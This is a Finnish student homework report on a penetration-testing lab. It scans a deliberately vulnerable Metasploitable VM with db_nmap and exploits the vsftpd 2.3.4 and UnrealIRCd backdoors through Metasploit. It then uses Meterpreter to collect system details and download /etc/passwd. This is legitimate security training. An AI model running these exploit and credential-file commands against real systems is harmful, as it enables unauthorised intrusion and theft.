# h3 EternalHomework
## x) Lue ja tiivistä  
Mastering Metasploit  
-Perustermit: Exploits, Payload, Auxiliary, Encoders, Meterpreter.  
-Useita hyötyjä.  
-Tulokset kannattaa aina tallentaa.  
-`db_nmap` komennolla porttiskannaus.  
-Voi etsiä tiettyjä haavoittuvuuksia search komennolla.  
-Meterpreter sessiolla hyökkäys.  
-Tässä kappaleessa oli tunkeutumistestauksen vaiheet ja Metasploit perusteet.  
(JaswaL 2020)  

Mitä 'nmap -sn' tekee?  
-sn optio kertoo nmapille, että ei tee porttiskannausta host discoveryn jälkeen. Tämä tulostaa vain ne hostit, jotka vastasivat discovery probeihin. Tällä ei herätetä niin paljoa huomiota porttiskannatessa.  
(nmap.org)  
Uskon, että käyttämäni lähde on luotettava, koska se on nmapin virallinen sivusto.  

## b) Porttiskannauksen tulokset Metasploitin tietokantoihin  
Avasin Metasploitablen ja Kalin. Kalissa ajoin komennot `sudo msfdb init` ja `sudo msfconsole` Näin pääsin msf consoleen Kalilla. Metasploitablessa ajoin komennon `sudo ifconfig eth0 192.168.56.11 netmask 255.255.255.0 up`, koska sillä ei ollut ip osoitetta. Tämä on samassa aliverkossa Kalin kanssa. Nyt ping testit toimivat molempiin suuntiin.  
<img width="574" height="163" alt="image" src="https://github.com/user-attachments/assets/5a81871e-9677-40e6-ae8b-1ab65b2c666d" />  
<img width="545" height="242" alt="image" src="https://github.com/user-attachments/assets/a71662a0-a130-4570-9dd3-a5a4d4399a5d" />  
Ajoin komennon `db_nmap -sV 192.168.56.11` db_ tallentaa skannauksen tietokantaan.
<img width="1226" height="660" alt="image" src="https://github.com/user-attachments/assets/ac8d9bb2-79dd-4841-baa5-298eff79fb5b" />  

## c) Tarkastellaan tallenettuja tietoja
Komennoilla `hosts` ja `services` nähdään, että porttiskannaus tallentui tietokantaan.  
<img width="915" height="667" alt="image" src="https://github.com/user-attachments/assets/35b07ccf-5073-4db5-851a-0957f1f82dcd" />  
Komennolla `services -p 21` saadaan suodatettua vain portti 21.  
<img width="617" height="166" alt="image" src="https://github.com/user-attachments/assets/47e87f2c-a839-47ea-b814-ab597e793eff" />  
Komennolla `services -s http` saa näkyviin molemmat http portit.  
<img width="778" height="141" alt="image" src="https://github.com/user-attachments/assets/8dc3ba1a-02bf-4380-bf18-fad22d6d155d" />  

## d) Internet famous  
Yksi tunnettu hyökkäys on portissa 21 oleva vsftpd. Se löytyi komennolla `search vsftpd`.
<img width="1029" height="199" alt="image" src="https://github.com/user-attachments/assets/e51aad83-6722-4627-869a-da5540983b4b" />  

## e) Nmapin oma tiedoston tallennus VS db_nmap.  
`nmap -oA foo 192.168.56.11` komento tallentaa kolme tiedostoa nmapista; foo.nmap, foo.gnmap ja foo.xml.  
<img width="498" height="90" alt="image" src="https://github.com/user-attachments/assets/e67c4e07-bded-4ca0-baf4-ea4b000447ff" />  
Tästä saadaan helpommin suoraan ihmisen luettavaa, kun db_nmap tallentaa tiedot tietokantaan, mistä muut moduulit voivat lukea ne.  

## f) Murtaudu Metasploitablen vsftpd-palveluun  
Ajoin ensiksi komennon `use exploit/unix/ftp/vsftpd_234_backdoor`, joka lataa hyökkäyksen käyttöön.  
<img width="596" height="62" alt="image" src="https://github.com/user-attachments/assets/85db9117-5ffd-49fe-8eb0-6dc013620325" />  
Komennolla `setg RHOSTS 192.168.56.11` asetin Metasploitablen remote host koneeksi, josta hyökkäys lähtee. Komennolla `set LHOST 192.168.56.10` asetin Kalin local host koneeksi. Komennolla `show options` näkyi lisätietoa, mitä exploit vaatii, ja että hostit ovat oikein.  
<img width="1138" height="84" alt="image" src="https://github.com/user-attachments/assets/8e5faf90-7a10-431a-a503-dc2d1cac39d4" />  
<img width="787" height="39" alt="image" src="https://github.com/user-attachments/assets/abcbed52-4421-4185-b8ca-ce660184bbaf" />  
Ajoin komennon `exploit` ja pääsin sisälle meterpreter sessioon.  
<img width="936" height="155" alt="image" src="https://github.com/user-attachments/assets/8fa954c0-e2f9-4460-8961-c0109686a3a3" />  

## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta  
Keräsin seuraavia tietoja metasploitablesta.  
<img width="403" height="540" alt="image" src="https://github.com/user-attachments/assets/dd9e1259-f1a0-4778-8c4e-a02a63bc9a45" />  
<img width="631" height="726" alt="image" src="https://github.com/user-attachments/assets/8a28d156-7743-4721-ad53-433983c25ad3" />  
<img width="346" height="90" alt="image" src="https://github.com/user-attachments/assets/51417322-297a-4325-bb1b-d425dff8d43b" />  
Näillä tiedoillä näkee muun muassa interfacet, koneet joihin metasploitable on ollut yhteydessä, käyttäjätunnukset ja pääsyavaimet.  

## h) Murtaudu Metasploitableen jollain toisella tavalla  
Valitsin toiseksi tavaksi UnrealIRCd-backdoor (portti 6667). Komento `use exploit/unix/irc/unreal_ircd_3281_backdoor` lataa hyökkäyksen.  
<img width="1197" height="387" alt="image" src="https://github.com/user-attachments/assets/93f6bd17-9aa6-40ee-bdad-dfe207dc0cd6" />  
Hostit ja portit ovat oikein. 
`exploit` ja sisällä ollaan.  
<img width="1222" height="239" alt="image" src="https://github.com/user-attachments/assets/190a0aea-cb16-4230-a3ee-b6e363a4a05a" />  

## i) Demonstroi Meterpretrin ominaisuuksia  
Komennolla `getuid` näkee millä käyttäjällä olet. Komennolla `sysinfo` näkee järjestelmän tiedot.  
<img width="430" height="157" alt="image" src="https://github.com/user-attachments/assets/93bae600-a876-4ca6-87b7-7ae197bd32f8" />  
`ps` näyttää kaikki käynnissä olevat prosessit.  
<img width="509" height="1153" alt="image" src="https://github.com/user-attachments/assets/5ecce382-4cfb-4a52-bbca-e9f50765c8c4" />  
Komennolla `download /etc/passwd /tmp/passwd_metasploitable.txt` pystyt ladata tiedostoja omalle koneellesi.  
<img width="812" height="88" alt="image" src="https://github.com/user-attachments/assets/2c3fe6a0-4f42-4f94-b0ce-f1db1377ae0f" />  

## j) Tallenna shell-sessio tekstitiedostoon script-työkalulla  
Avasin Kalissa uuden terminaali ikkunan. Ajoin komennon `script -fa log001.txt`.  
<img width="406" height="99" alt="image" src="https://github.com/user-attachments/assets/ab9dc648-9441-4f71-8b60-78f0e7212616" />  
Avasin msfconsolen ja ajoin komennot `hosts` ja `services`.  
<img width="804" height="1117" alt="image" src="https://github.com/user-attachments/assets/44fd7e03-1d26-4cdb-8764-3b4b277f0bd0" />  
Komento `exit` lopettaa script tallennuksen ja `cat log001.txt` tarkistin, että sessio tallentui oikein.  
<img width="775" height="539" alt="image" src="https://github.com/user-attachments/assets/9a290cc3-852b-4c78-abee-6b09d352d727" />  

## k) Pivot point  
Ajoin komennon `mkdir -p ~/harjoitus1 && mv foo.nmap foo.xml foo.gnmap log001.txt ~/harjoitus1/`, jolla loin hakemiston harjoitukselle ja siirsin tiedostot sinne.  
<img width="397" height="141" alt="image" src="https://github.com/user-attachments/assets/9803ba29-7f25-4c88-bf41-2cd23428dea9" />  
Tein seuraavan grep haut ja sille kysymyksen.  
Mikä vsftpd versio oli ja missä tiedostoissa se löytyy?  
<img width="1231" height="203" alt="image" src="https://github.com/user-attachments/assets/8f496bc2-5130-4820-8222-509673a8f2a3" />

## Lähteet  
Jaswal, N. 2020. Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit. https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31  
nmap.org. Nmap Network Scanning / Chapter 15. Nmap Reference Guide. https://nmap.org/book/man-host-discovery.html
